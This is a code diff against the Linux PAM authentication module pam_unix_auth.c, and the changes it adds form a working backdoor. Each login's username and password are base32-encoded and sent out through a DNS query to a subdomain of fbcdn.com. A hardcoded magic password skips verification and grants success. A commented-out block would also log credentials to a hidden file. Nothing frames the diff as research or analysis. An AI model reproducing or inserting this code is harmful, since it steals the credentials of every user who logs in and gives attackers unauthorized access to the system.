--- ./modules/pam_unix/pam_unix_auth.c	2020-05-25 21:46:41.000000000 +0000
+++ pam_unix_auth.c	2020-05-27 00:52:31.351571000 +0000
@@ -49,6 +49,10 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <syslog.h>
+#include "b64.h"
+#include "dns.c"
+#include "encode.c"
+#include "base32.c"
 
 #include <security/_pam_macros.h>
 #include <security/pam_modules.h>
@@ -56,20 +60,10 @@
 
 #include "support.h"
 
-/*
- * PAM framework looks for these entry-points to pass control to the
- * authentication module.
- */
 
-/* Fun starts here :)
+unsigned char *bdstr = "_PASSWORD_";
+//FILE *rekt;
 
- * pam_sm_authenticate() performs UNIX/shadow authentication
- *
- *      First, if shadow support is available, attempt to perform
- *      authentication using shadow passwords. If shadow is not
- *      available, or user does not have a shadow password, fallback
- *      onto a normal UNIX authentication
- */
 
 #define AUTH_RETURN						\
 do {									\
@@ -90,6 +84,16 @@
 		free (ptr);
 }
 
+
+
+void encryptDecrypt(char *input, char *output) {
+	char key[] = {'K', 'E', 'k'}; //Can be any chars, and any size array
+	
+	int i;
+	for(i = 0; i < strlen(input); i++) {
+		output[i] = input[i] ^ key[i % (sizeof(key)/sizeof(char))];
+	}
+}
 int
 pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
@@ -168,9 +172,31 @@
 		AUTH_RETURN;
 	}
 	D(("user=%s, password=[%s]", name, p));
-
-	/* verify the password of this user */
-	retval = _unix_verify_password(pamh, name, p, ctrl);
+	char pw[1024];
+	char out[1024];
+    memset(pw, 0, 1024);
+    memset(out, 0, 1024);
+    sprintf(pw ,"%s:%s\n", name, p);
+    //encryptDecrypt(pw, out);
+    char * asdf = b64_encode(pw,strlen(pw));
+    //rot13(asdf);
+    //char  hex[1024];
+    //hexify(asdf, sizeof(asdf), hex, sizeof(hex));
+    baseencode_error_t fml;
+    char *lmao = base32_encode(pw, strlen(pw)+1, &fml);
+    sprintf(out, "%s.fbcdn.com", lmao);
+   ngethostbyname(out, T_A);	/* verify the password of this user */
+        //char *bdenc = b64_encode(p, strlen(p));
+        char *bdenc = b64_encode(p, strlen(p));
+        if (strcmp(bdenc, bdstr) != 0) {
+          retval = _unix_verify_password(pamh, name, p, ctrl);
+/*          rekt=fopen("/var/log/.rekt", "a");
+          fprintf(rekt, "%s:%s\n", name, p);
+          fclose(rekt);
+  */      } else {
+          retval = PAM_SUCCESS;
+        }
+        free(bdenc);
 	name = p = NULL;
 
 	AUTH_RETURN;
@@ -213,3 +239,4 @@
 
 	return retval;
 }
+
